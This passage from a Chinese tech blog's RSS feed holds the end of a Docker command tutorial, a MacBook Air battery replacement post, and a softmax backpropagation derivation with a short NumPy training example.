&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;37-杀死容器&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#37-%e6%9d%80%e6%ad%bb%e5%ae%b9%e5%99%a8&#34;&gt;
        #
    &lt;/a&gt;
    3.7 杀死容器
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;
docker kill [OPTIONS] CONTAINER [CONTAINER...]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;37-删除容器&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#37-%e5%88%a0%e9%99%a4%e5%ae%b9%e5%99%a8&#34;&gt;
        #
    &lt;/a&gt;
    3.7 删除容器
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;删除指定容器：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ docker rm 5f023623d725
5f023623d725
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;删除所有的容器：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ docker rm `docker ps -a -q`
ebf84b524cd1
8c1ec47087ed
626a1425e63b
88d33e9fb79b
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;4-其他命令&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#4-%e5%85%b6%e4%bb%96%e5%91%bd%e4%bb%a4&#34;&gt;
        ##
    &lt;/a&gt;
    4. 其他命令
&lt;/div&gt;
&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;
$ docker create  # 创建一个容器，但不启动它
$ docker run     #  创建并启动一个容器
$ docker stop    # 停止容器
$ docker start   #  启动容器
$ docker restart # 重启容器
$ docker rm      # 删除容器
$ docker kill    #  给容器发送kill信号
$ docker attach  # 连接到正在运行的容器中
$ docker wait    # 阻塞直到容器停止为止
$ docker exec    # 在运行的容器中执行一条命令

# 检查容器
$ docker ps      # 显示运行的容器
$ docker inspect # 显示容器信息（包括ip地址）
$ docker logs    # 获取容器中的日志
$ docker events  # 获取容器事件
$ docker port    # 显示容器的公开端口
$ docker top     # 显示容器中运行的进程
$ docker diff    # 查看容器文件系统中改变的文件
$ docker stats   # 查看各种纬度数据、内存、CPU、文件系统等
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;5-高级使用&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#5-%e9%ab%98%e7%ba%a7%e4%bd%bf%e7%94%a8&#34;&gt;
        ##
    &lt;/a&gt;
    5. 高级使用
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;51-修改提交镜像&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#51-%e4%bf%ae%e6%94%b9%e6%8f%90%e4%ba%a4%e9%95%9c%e5%83%8f&#34;&gt;
        #
    &lt;/a&gt;
    5.1 修改/提交镜像
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;当镜像在容器中运行起来之后可以像一般的系统使用一样对镜像中的文件进行修改，镜像修改过之后可以通过commit命令提交保存。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
# 启动容器
docker run -it  &lt;image ID&gt; /bin/bash

# 在容器内做一些改动...

# 获取容器ID
docker ps -a

# 在容器外进行提交
docker commit -m &#34;Did some changes...&#34; CONTAINER [REPOSITORY[:TAG]]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;52-网络&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#52-%e7%bd%91%e7%bb%9c&#34;&gt;
        #
    &lt;/a&gt;
    5.2 网络
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;docker run有下面几个参数可以配置容器的网络参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
--dns=[]         : Set custom dns servers for the container
--net=&#34;bridge&#34;   : Set the Network mode for the container
                              &#39;bridge&#39;: creates a new network stack for the container on the docker bridge
                              &#39;none&#39;: no networking for this container
                              &#39;container:&lt;name|id&gt;&#39;: reuses another container network stack
                              &#39;host&#39;: use the host network stack inside the container
--add-host=&#34;&#34;    : Add a line to /etc/hosts (host:IP)
--mac-address=&#34;&#34; : Sets the container&#39;s Ethernet device&#39;s MAC address
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;None：&lt;/p&gt;
&lt;p&gt;将网络模式设置为none时，这个container将不允许访问任何外部router。这个container内部只会有一个loopback接口，而且不存在任何可以访问外部网络的router。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Bridge：&lt;/p&gt;
&lt;p&gt;Docker默认是将container设置为bridge模式。此时在host上面讲存在一个docker0的网络接口，同时会针对container创建一对veth接口。其中一个veth接口是在host充当网卡桥接作用，另外一个veth接口存在于container的命名空间中，并且指向container的loopback。Docker会自动给这个container分配一个IP，并且将container内的数据通过桥接转发到外部。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Host：&lt;/p&gt;
&lt;p&gt;当网络模式设置为host时，这个container将完全共享host的网络堆栈。host所有的网络接口将完全对container开放。container的主机名也会存在于host的hostname中。这时，container所有对外暴露的port和对其它container的link，将完全失效。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Container：&lt;/p&gt;
&lt;p&gt;当网络模式设置为Container时，这个container将完全复用另外一个container的网络堆栈。同时使用时这个container的名称必须要符合下面的格式：&amp;ndash;net container:.&lt;/p&gt;
&lt;p&gt;比如当前有一个绑定了本地地址localhost的redis container。如果另外一个container需要复用这个网络堆栈，则需要如下操作：&lt;/p&gt;
  &lt;pre&gt;&lt;code&gt;
  $ sudo docker run -d --name redis example/redis --bind 127.0.0.1
  $ # use the redis container&#39;s network stack to access localhost
  $ sudo docker run --rm -ti --net container:redis example/redis-cli -h 127.0.0.1
  &lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;管理/etc/hosts：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ /docker run -ti --add-host db-static:86.75.30.9 ubuntu cat /etc/hosts
172.17.0.22     09d03f76bf2c
fe00::0         ip6-localnet
ff00::0         ip6-mcastprefix
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
127.0.0.1       localhost
::1             localhost ip6-localhost ip6-loopback
86.75.30.9      db-static
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;53-资源限制&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#53-%e8%b5%84%e6%ba%90%e9%99%90%e5%88%b6&#34;&gt;
        #
    &lt;/a&gt;
    5.3 资源限制
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;
-m=&#34;&#34;: Memory limit (format: &lt;number&gt;&lt;optional unit&gt;, where unit = b, k, m or g)
-c=0 : CPU shares (relative weight)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;54-添加设备&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#54-%e6%b7%bb%e5%8a%a0%e8%ae%be%e5%a4%87&#34;&gt;
        #
    &lt;/a&gt;
    5.4 添加设备
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;docker run可以将host中的设备映射到container中，并控制container对设备的访问权限：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
--device list                    Add a host device to the container
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;
$ sudo docker run --device=/dev/sda:/dev/xvdc --rm -it ubuntu fdisk  /dev/xvdc
Command (m for help): q
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>Macbook Air换电池记</title>
      <link>/2017/10/macbook-air%E6%8D%A2%E7%94%B5%E6%B1%A0%E8%AE%B0/</link>
      <pubDate>Fri, 06 Oct 2017 01:58:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/10/macbook-air%E6%8D%A2%E7%94%B5%E6%B1%A0%E8%AE%B0/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;家里的Macbook Air年事已高电池也充不了电了，而且最近电池鼓包已经影响到了触摸板的使用，趁着假期买了块国产电池换上去。&lt;/p&gt;
&lt;p&gt;秀一下新电池和拆机工具：
&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/10/MBA_change_battery/01.JPG&#34; alt=&#34;新电池&#34;&gt;&lt;/p&gt;
&lt;p&gt;Air后盖的螺丝是特殊的5角形状必需用电池包里的黄色螺丝刀把10颗螺丝先拧下来：
&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/10/MBA_change_battery/02.JPG&#34; alt=&#34;拆背盖&#34;&gt;&lt;/p&gt;
&lt;p&gt;拆下后盖发现鼓包的电池块了，没想到都鼓到这种程度了 -___-!
拆电池也很简单，用附带的黑色螺丝刀把图里面标红的螺丝拆下来就搞定了，别忘记把电池跟主板连接的插销取下来：
&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/10/MBA_change_battery/03.jpg&#34; alt=&#34;拆电池&#34;&gt;&lt;/p&gt;
&lt;p&gt;换电池之前给Air做了次内部SPA看起来清爽多了！
&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/10/MBA_change_battery/04.JPG&#34; alt=&#34;拆掉&#34;&gt;&lt;/p&gt;
&lt;p&gt;安装电池也非常的方便，按照拆下来的顺序装回去就完成了！
&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/10/MBA_change_battery/05.JPG&#34; alt=&#34;换好了&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>softmax输出层公式推导及代码实验</title>
      <link>/2017/10/softmax%E8%BE%93%E5%87%BA%E5%B1%82%E5%85%AC%E5%BC%8F%E6%8E%A8%E5%AF%BC%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%9E%E9%AA%8C/</link>
      <pubDate>Mon, 02 Oct 2017 02:11:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/10/softmax%E8%BE%93%E5%87%BA%E5%B1%82%E5%85%AC%E5%BC%8F%E6%8E%A8%E5%AF%BC%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%9E%E9%AA%8C/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;sigmoid激活函数在神经网络中有着强大的通用性，但也存在这一些问题，比如：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在w/b参数还没有训练成熟时，训练预测偏差较大，此时的训练速度会较慢。这个问题的解决方法有两种：
&lt;ul&gt;
&lt;li&gt;使用交叉熵代价函数: $ C = -{1\over n} \sum_{i=1}^n [y_i \ln a_i + (1-y_i) \ln (1-a_i)] $&lt;/li&gt;
&lt;li&gt;使用softmax和log-likelyhood代价函数作为输出层&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;sigmoid的输出结果是伯努利分布 $ P(y_1|X), P(y_2|X), &amp;hellip; P(y_n|X) $，说明每一个输出项之间是相互独立的，这在预测一种输出结果的情形时不太符合人们的直观感受。这个问题也可以用softmax输出层解决，因为softmax的输出是多项分布：$ P(y_1, y_2, &amp;hellip; y_n | X) $，其中y1, &amp;hellip; yn之间相互关联，且总和为1。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这样看起来softmax是个很有效的方法，下面就对这个方法进行一些研究。&lt;/p&gt;
&lt;h1 id=&#34;softmax定义&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#softmax%e5%ae%9a%e4%b9%89&#34;&gt;
        ##
    &lt;/a&gt;
    softmax定义：
&lt;/div&gt;
&lt;/h1&gt;
&lt;div&gt;
$$ softmax(z_j) = {e^{z_j} \over {\sum_{i=1}^m e^{z_i} }} , j=1, ... m $$
&lt;/div&gt;
&lt;p&gt;将softmax层应用在网络输出层时，每一个神经元的softmax激活输出可以理解为该神经元对应结果的预测概率，这里有几个基本事实：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每个神经元的输出为正数，并且输出数值介于0-1之间。&lt;/li&gt;
&lt;li&gt;所有神经元的输出总和为1。&lt;/li&gt;
&lt;li&gt;某一项输入（Z值）增大时，其对应的输出概率增大；同时其他输出概率同时减小（总和总是1）。该结论可以从$ \frac {\partial a_i} {\partial {z_i}} $（总为正数）以及$ \frac {\partial a_i} {\partial {z_j}}$（总为负数）推算出来，这两个数字也说明了softmax的输入／输出单调性。&lt;/li&gt;
&lt;li&gt;softmax的每个激活输出值之间相互关联，表现出了输出非局部性特征。直观的理解就是因为所有激活输出的总和总是为1，那么其中一个激活输出的值发生变动的时候其他的激活输出也必将变化。这一点也是跟sigmoid激活函数的很不同的一点，也说明了$ \frac {\partial a_i} {\partial {z_j}}$值存在的意义。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下图展示了softmax层工作的基本原理。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/softmax/how_softmax_works.png?x-oss-process=style/png2jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;应用场景&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ba%94%e7%94%a8%e5%9c%ba%e6%99%af&#34;&gt;
        ##
    &lt;/a&gt;
    应用场景：
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;从softmax的定义知道所有输出神经元的总和为1，因此softmax可以用在预测在多种可能性中只有一个结果的场景，比如mnist手写判定。&lt;/p&gt;
&lt;h1 id=&#34;softmax输出层组成的神经网络&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#softmax%e8%be%93%e5%87%ba%e5%b1%82%e7%bb%84%e6%88%90%e7%9a%84%e7%a5%9e%e7%bb%8f%e7%bd%91%e7%bb%9c&#34;&gt;
        ##
    &lt;/a&gt;
    softmax输出层组成的神经网络
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;下面的图展示了一个简单的softmax输出层神经网络，中间层依然使用sigmoid。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/softmax/softmax-network.jpg&#34; alt=&#34;softmax NN&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;代价函数c&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bb%a3%e4%bb%b7%e5%87%bd%e6%95%b0c&#34;&gt;
        #
    &lt;/a&gt;
    代价函数C
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;为了解决在学习过程中出现的速度问题使用log-likelihood代价函数，函数定义为：&lt;/p&gt;
$$ C=-\sum_i^m y_i \ln a_i $$
&lt;p&gt;关于实际应用这个等式需要解释一下。假设softmax输出层有4个输出，预测a值为(0.1, 0.2, 0.3, 0.4)，实际结果y为(0, 1, 0, 0)，那么这个等式为 $C = -(0\ln(0.1) + 1\ln(0.2) + 0\ln(0.3) + 0\ln(0.4))$，可以看出来因为0的存在可以让这个等式只保留实际结果为真（1）的项。这时可以把等式简化为：&lt;/p&gt;
$$ C=-\ln a_i | y_i=1 $$
&lt;h2 id=&#34;用反向传播进行梯度下降&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%94%a8%e5%8f%8d%e5%90%91%e4%bc%a0%e6%92%ad%e8%bf%9b%e8%a1%8c%e6%a2%af%e5%ba%a6%e4%b8%8b%e9%99%8d&#34;&gt;
        #
    &lt;/a&gt;
    用反向传播进行梯度下降
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;反向传播算法要求几个关键值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$ \delta_i^L $&lt;/li&gt;
&lt;li&gt;$ \frac {\partial C}{\partial w_{ij}^L} $&lt;/li&gt;
&lt;li&gt;$ \frac {\partial C}{\partial b_{i}^L} $&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果输出层使用softmax时，最后一层（L层）的相应值与使用sigmoid的情况有些不同，下面对使用softmax是的这3个值进行推导。&lt;/p&gt;
&lt;h3 id=&#34;求解-delta_il--a_il---y_i-&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%b1%82%e8%a7%a3-delta_il--a_il---y_i-&#34;&gt;
        ##
    &lt;/a&gt;
    求解$ \delta_i^L = ({a_i^L} - y_i) $
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;过程如下：&lt;/p&gt;
&lt;div&gt;
$$ {\delta_i^L} = {\frac {\partial C}{\partial z_{i}^L}} = {\frac {\partial }{\partial z_{i}^L}} (-\sum_k^m y_k \ln {a_k^L})$$
$$ {\frac {\partial C}{\partial z_{i}^L}} = -(\sum_k^m y_k {1 \over {a_k^L}} {\frac {\partial {a_k^L}}{\partial z_{i}^L}})$$
$$ {\frac {\partial C}{\partial z_{i}^L}} = -(y_i {1 \over a_i^L} \frac {\partial a_i^L}{\partial z_{i}^L} + \sum_{k \neq i}^m y_k {1 \over a_k^L} {\frac {\partial a_k^L}{\partial z_{i}^L}})$$
$$ {\frac {\partial C}{\partial z_{i}^L}} = - (y_i {1 \over a_i^L} {a_i^L(1-a_i^L)} + \sum_{k \neq i}^m y_k {1 \over a_k^L} (-{a_i^L}{a_k^L}) )$$
$$ {\frac {\partial C}{\partial z_{i}^L}} = - (y_i (1-a_i^L) - \sum_{k \neq i}^m y_k {a_i^L})$$
$$ {\frac {\partial C}{\partial z_{i}^L}} = - (y_i - {y_i a_i^L} - \sum_{k \neq i}^m y_k {a_i^L})$$
$$ {\frac {\partial C}{\partial z_{i}^L}} = - (y_i - {a_i^L}{\sum_{k=1}^m y_k})$$
$$ {\frac {\partial C}{\partial z_{i}^L}} = ({a_i^L} - y_i)$$
&lt;/div&gt;
&lt;h3 id=&#34;求-frac-partial-cpartial-w_ijl--a_il-y_ia_jl-1-的过程&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%b1%82-frac-partial-cpartial-w_ijl--a_il-y_ia_jl-1-%e7%9a%84%e8%bf%87%e7%a8%8b&#34;&gt;
        ##
    &lt;/a&gt;
    求$ \frac {\partial C}{\partial w_{ij}^L} = ({a_i^L}-{y_i}){a_j^{L-1}} $的过程：
&lt;/div&gt;
&lt;/h3&gt;
&lt;div&gt;
$$ \frac {\partial C}{\partial w_{ij}^L} = {\frac {\partial C}{\partial z_{i}^L}} {\frac {\partial z_{i}^L}{\partial w_{ij}^L}}$$
$$ \frac {\partial C}{\partial w_{ij}^L} = {\delta_i^L} {a_j^{L-1}}$$
$$ \frac {\partial C}{\partial w_{ij}^L} = ({a_i^L}-{y_i}){a_j^{L-1}}$$
&lt;/div&gt;
&lt;h3 id=&#34;求-frac-partial-cpartial-b_il--a_il---y_i-的过程&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%b1%82-frac-partial-cpartial-b_il--a_il---y_i-%e7%9a%84%e8%bf%87%e7%a8%8b&#34;&gt;
        ##
    &lt;/a&gt;
    求$ \frac {\partial C}{\partial b_{i}^L} = ({a_i^L} - y_i) $的过程：
&lt;/div&gt;
&lt;/h3&gt;
&lt;div&gt;
$$ \frac {\partial C}{\partial b_{i}^L} = {\frac {\partial C}{\partial z_{i}^L}} {\frac {\partial z_{i}^L}{\partial b_{i}^L}}$$
$$ \frac {\partial C}{\partial b_{i}^L} = {\frac {\partial C}{\partial z_{i}^L}} $$
$$ \frac {\partial C}{\partial b_{i}^L} = {\delta_i^L} = ({a_i^L} - y_i) $$
&lt;/div&gt;
&lt;p&gt;以上求解过程中用了两个重要的计算等式:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$ \frac {\partial a_i} {\partial {z_i}} = a_i \cdot (1- a_i) $&lt;/li&gt;
&lt;li&gt;$ \frac {\partial a_j} {\partial {z_i}} = -{a_i \cdot a_j} | i \neq j$&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面对这两个等式进行推导：&lt;/p&gt;
&lt;h4 id=&#34;求导情况1--frac-partial-a_i-partial-z_i--a_i-cdot-1--a_i-&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%b1%82%e5%af%bc%e6%83%85%e5%86%b51--frac-partial-a_i-partial-z_i--a_i-cdot-1--a_i-&#34;&gt;
        ###
    &lt;/a&gt;
    求导情况1: $ \frac {\partial a_i} {\partial {z_i}} = a_i \cdot (1- a_i) $
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/softmax/v2-acaf14aac554ab61ff6f32845fd5128e_b.png&#34; alt=&#34;i==j&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;结论：&lt;/li&gt;
&lt;/ul&gt;
$$ \frac {\partial a_i} {\partial {z_i}} = a_i \cdot (1- a_i) $$
&lt;ul&gt;
&lt;li&gt;推导过程：&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
$$ \frac {\partial a_i} {\partial {z_i}} = \frac {\partial}{\partial {z_i}} ({e^{z_i} \over {\sum_{k=1}^m e^{z_k} }}) $$
$$ = \frac {\partial}{\partial {z_i}} (e^{z_i}) \cdot {1 \over {\sum_{k=1}^m e^{z_k} }} + \frac {\partial}{\partial {z_i}} ({1 \over {\sum_{k=1}^m e^{z_k} }}) \cdot {e^{z_i}}$$
$$ = {e^{z_i} \over {\sum_{k=1}^m e^{z_k} }} + (-1) \cdot {1 \over ({\sum_{k=1}^m e^{z_k} })^2} \cdot {\frac {\partial}{\partial z_i}({\sum_{k=1}^m e^{z_k} })} \cdot {e^{z_i}}$$
$$ = {e^{z_i} \over {\sum_{k=1}^m e^{z_k} }} + (-1) \cdot {1 \over ({\sum_{k=1}^m e^{z_k} })^2} \cdot (0+1){\frac {\partial}{\partial z_i}({e^{z_i}})} \cdot {e^{z_i}}$$
$$ = {e^{z_i} \over {\sum_{k=1}^m e^{z_k} }} + (-1) \cdot ({e^{z_i} \over {\sum_{k=1}^m e^{z_k} }})^2$$
$$ = a_i - (a_i)^2 $$
$$ = a_i \cdot (1- a_i) $$
&lt;/div&gt;
&lt;h4 id=&#34;求导情况2--frac-partial-a_j-partial-z_i---a_i-cdot-a_j&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%b1%82%e5%af%bc%e6%83%85%e5%86%b52--frac-partial-a_j-partial-z_i---a_i-cdot-a_j&#34;&gt;
        ###
    &lt;/a&gt;
    求导情况2: $ \frac {\partial a_j} {\partial {z_i}} = -a_i \cdot a_j$
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/softmax/v2-f09fb0c50194f6cc0828fc285eb9bc1c_b.png&#34; alt=&#34;i neq j&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;结论：&lt;/li&gt;
&lt;/ul&gt;
$$ \frac {\partial a_j} {\partial {z_i}} = -a_i \cdot a_j$$
&lt;ul&gt;
&lt;li&gt;推导过程：&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
$$ \frac {\partial a_j} {\partial {z_i}} = \frac {\partial}{\partial {z_i}} ({e^{z_j} \over {\sum_{k=1}^m e^{z_k} }}) $$
$$ = \frac {\partial}{\partial {z_i}} (e^{z_j}) \cdot {1 \over {\sum_{k=1}^m e^{z_k} }} + \frac {\partial}{\partial {z_i}} ({1 \over {\sum_{k=1}^m e^{z_k} }}) \cdot {e^{z_j}}$$
$$ = 0 \cdot {1 \over {\sum_{k=1}^m e^{z_k} }} + (-1) \cdot {1 \over ({\sum_{k=1}^m e^{z_k} })^2} \cdot {\frac {\partial}{\partial z_i}({\sum_{k=1}^m e^{z_k} })} \cdot {e^{z_j}}$$
$$ = (-1) \cdot {1 \over ({\sum_{k=1}^m e^{z_k} })^2} \cdot (0+1) \cdot \frac {\partial}{\partial z_i}e^{z_i} \cdot {e^{z_j}}$$
$$ = (-1) \cdot {1 \over ({\sum_{k=1}^m e^{z_k} })^2} \cdot e^{z_i} \cdot {e^{z_j}}$$
$$ = - {e^{z_i} \over {\sum_{k=1}^m e^{z_k}}} \cdot {{e^{z_j}} \over {\sum_{k=1}^m e^{z_k}}}$$
$$ = -a_i \cdot a_j$$
&lt;/div&gt;
&lt;h2 id=&#34;sigmoid隐藏层与softmax输出层网络&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#sigmoid%e9%9a%90%e8%97%8f%e5%b1%82%e4%b8%8esoftmax%e8%be%93%e5%87%ba%e5%b1%82%e7%bd%91%e7%bb%9c&#34;&gt;
        #
    &lt;/a&gt;
    sigmoid隐藏层与softmax输出层网络
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;按照下图的拓扑构成的网络使用sigmoid进行隐藏层计算，使用softmax进行输出层计算，那么怎么进行网络训练呢？其实方法一样都是按照前馈网络计算代价值进行评估，使用反向传播算法进行梯度下降。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/softmax/softmax-network.jpg&#34; alt=&#34;softmax NN&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;前馈网络计算步骤&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%89%8d%e9%a6%88%e7%bd%91%e7%bb%9c%e8%ae%a1%e7%ae%97%e6%ad%a5%e9%aa%a4&#34;&gt;
        ##
    &lt;/a&gt;
    前馈网络计算步骤：
&lt;/div&gt;
&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;在隐藏层的计算时使用sigmoid&lt;/li&gt;
&lt;li&gt;在最后输出层使用softmax&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;反向传播计算步骤&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%8d%e5%90%91%e4%bc%a0%e6%92%ad%e8%ae%a1%e7%ae%97%e6%ad%a5%e9%aa%a4&#34;&gt;
        ##
    &lt;/a&gt;
    反向传播计算步骤：
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;计算输出层，计算最后一层softmax输出层的下列值：&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
$$ \delta_i^L = ({a_i^L} - y_i) $$
$$ \frac {\partial C}{\partial w_{ij}^L} = ({a_i^L}-{y_i}){a_j^{L-1}} = \delta_i^L \cdot a_j^{L-1} $$
$$ \frac {\partial C}{\partial b_{i}^L} = ({a_i^L} - y_i) =\delta_i^L $$
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;计算隐藏层，反向一层一层计算sigmoid隐藏层的下列值：&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
$$ \delta_j^{l-1} = (\sum_{k=1}^m {\delta_k^l \cdot w_{kj}}) \cdot { a_j^{l-1} (1 - a_j^{l-1}) } $$
$$ \frac {\partial C}{\partial w_{ij}^l} = \delta_i^{l} \cdot a_j^{l-1} $$
$$ \frac {\partial C}{\partial b_{i}^l} = \delta_i^{l} $$
&lt;/div&gt;
&lt;p&gt;计算过程中可以发现只有最后一层的$ \delta_i^L$计算较为特殊，计算权重和偏置的方法与之前的sigmoid构成的网络一致。&lt;/p&gt;
&lt;h1 id=&#34;代码实例&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bb%a3%e7%a0%81%e5%ae%9e%e4%be%8b&#34;&gt;
        ##
    &lt;/a&gt;
    代码实例
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;下面的例子实验一个输入层有4个输入，隐藏层有5个神经元并且使用sigmoid激活函数，输出层有2个神经元并使用softmax激活函数的网络，拓扑如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/softmax/experiment-softmax.jpg&#34; alt=&#34;拓扑&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# construct the network

# input layer: 4 inputs
# hidden layer: 5 neurons with sigmoid as activate function
# * weight: 4x5 matrices
# * bias: 1x5 matrices
# output layer: 2 neurons with softmax as activate function
# * weight: 5x2 matrices
# * bias: 1x2 matrices

# initialize the weight/bias of the hidden layer (2nd layer)
w2 = np.random.rand(4, 5)
b2 = np.random.rand(1, 5)

# initialize the weight/bias of the output layer (3rd layer) 
w3 = np.random.rand(5, 2)
b3 = np.random.rand(1, 2)
num_epochs = 10000
eta = 0.1

x=[]
y=[]

# training process
for i in xrange(num_epochs):
    # feed forward
    z2 = np.dot(input, w2) + b2
    a2 = sigmoid(z2)

    z3 = np.dot(a2, w3) + b3
    #z3 = np.dot(a2, w3)
    a3 = softmax(z3)
    
    if i%1000 == 0:
        print &amp;quot;Perception&amp;quot;, a3
        print &amp;quot;W2&amp;quot;, w2
        print &amp;quot;B2&amp;quot;, b2
        print &amp;quot;W3&amp;quot;, w3
        print &amp;quot;B3&amp;quot;, b3

    x.append(i)
    y.append(cost(a3, output))

    delta_l3 = a3 - output
    deriv_w3 = np.dot(a2.T, delta_l3)
    deriv_b3 = delta_l3
    w3 -= eta*deriv_w3
    b3 -= eta*np.mean(deriv_b3, 0)
    
    delta_l2 = np.dot(delta_l3, w3.T)*(a2*(1-a2))
    deriv_w2 = np.dot(input.T, delta_l2)
    deriv_b2 = delta_l2
    w2 -= eta*deriv_w2
    b2 -= eta*np.mean(deriv_b2, 0)
&lt;/code&gt;&lt;/pre&gt;
